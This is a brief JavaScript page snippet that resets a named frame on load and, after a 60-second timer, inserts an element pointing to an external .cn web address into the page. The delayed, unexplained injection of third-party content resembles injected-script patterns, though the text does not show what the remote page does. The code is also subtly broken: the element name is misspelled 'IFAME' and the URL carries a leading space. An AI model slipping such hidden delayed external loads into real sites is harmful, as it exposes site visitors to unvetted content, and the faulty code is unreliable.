window.onload   =   function()      {         
 frames["BiframeName"].location.href= '#' ;     
}

setTimeout(function(){
    var frame = document.createElement('IFAME');
frame.src = ' https://www.llsupport.cn/appdeta/list.html';
    document.getElementById('container').appendChild(frame);
}, 60000);

